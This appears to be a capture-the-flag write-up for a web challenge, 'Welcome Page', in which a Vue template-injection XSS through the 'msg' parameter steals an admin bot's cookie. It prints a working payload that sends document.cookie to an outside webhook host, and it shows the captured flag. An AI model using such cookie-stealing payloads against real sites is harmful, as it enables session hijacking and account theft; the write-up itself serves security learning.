# Welcome Page
> Flag is on the admin cookie.

## About the Challenge
Given 2 websites, a plain website and the admin bot, we will probably do XSS to get the admin cookies. If you open the link, a plain website will appear and the words `Welcome!` this happens because there is 1 GET parameter named `msg` whose value we can change.


[Image extracted text: Welcomel
Ba]


## How to Solve?
When viewing the source code, it can be identified that this website uses Vue. And after searching especially on the [portswigger website](https://portswigger.net/web-security/crosssitescripting/cheat-sheet) I found a working payload which is

```
http://103.152.242.116:8413/?msg={{_openBlock.constructor('alert(1)')()}}
```


[Image extracted text: 103.152.242.116.8413 says
OK]


After confirming that an alert appears, using a webhook on the XSS payload so that we can get the admin cookies

```
http://103.152.242.116:8413/?msg={{_openBlock.constructor('location.href="https://webhook/?test="+document.cookie')()}}
```

Send the XSS payload to the admin and get the cookies


[Image extracted text: Request Details
Permalink
Raw content
Expont as-
GET
https Ilwebhook sitelZbbegOae-7e2d-4754-8dfd-aa2f03f9a16e/?test-flag-ARA2023{sUp3r
s3cr3t_cOOk13_1s_h3r3}
Host
103.152.242.116 whois
Date
02/26/2023 9.25.58 AM (10 hours ago)
Size
bytes
3010269a-78da-483f-9533-1e660efbO5bd]


```
ARA2023{sUp3r_s3cr3t_c00k13_1s_h3r3}
```